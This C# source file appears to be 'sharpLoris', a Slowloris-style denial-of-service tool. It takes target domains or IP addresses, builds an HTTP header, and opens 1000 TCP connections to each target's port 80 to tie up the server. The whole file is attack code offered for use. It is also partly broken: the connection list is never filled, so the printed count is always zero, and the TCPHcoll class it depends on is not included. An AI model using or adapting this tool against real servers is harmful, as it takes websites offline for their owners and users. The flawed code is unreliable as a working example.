using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Net;
using System.Diagnostics;

namespace sharpLoris
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			if (args.Length == 0)
			{
				Console.WriteLine("Usage: sharpLoris.exe myDomain.de");
				return;
			}
			//http://araz4story.com/
			IPAddress IP;
			foreach (var item in args)
			{
				if (IPAddress.TryParse(item, out IP))
				{
					Console.WriteLine(HttpRequestAsync(item));
				}
				else if (IsValidDomainName(item))
				{
					Console.WriteLine(HttpRequestAsync(item));
				}
			}

			Console.WriteLine("Closing this..10 secs");
			Thread.Sleep(10000);
		}

		private static bool IsValidDomainName(string name)
		{
			return Uri.CheckHostName(name) != UriHostNameType.Unknown;
		}

		private static string HttpRequestAsync(string target)
		{
			var TcpCollection = new List<TCPHcoll>();
			string result = string.Empty;
			byte[] header;
			if (File.Exists("header.txt"))
			{
				Console.WriteLine("Found header file, loading...");
				var helpr = File.ReadAllText("header.txt").Replace("%host%", target);

				header = UTF8Encoding.UTF8.GetBytes(helpr);
			}
			else
			{
				Console.WriteLine("Found no header file, loading default one");
				var builder = new StringBuilder();
				builder.AppendLine("GET / HTTP/1.1");
				builder.AppendLine(String.Format("Host: {0}", target));
				builder.AppendLine("Connection: close");
				header = Encoding.ASCII.GetBytes(builder.ToString());
			}

			for (int i = 0; i < 1000; i++)
			{
				new TCPHcoll(target, 80, header);
			}
			Console.WriteLine("Initiated {0} connections", TcpCollection.Count);
			while (Console.ReadLine() != "Exit") ;

			return "Done";
		}
	}
}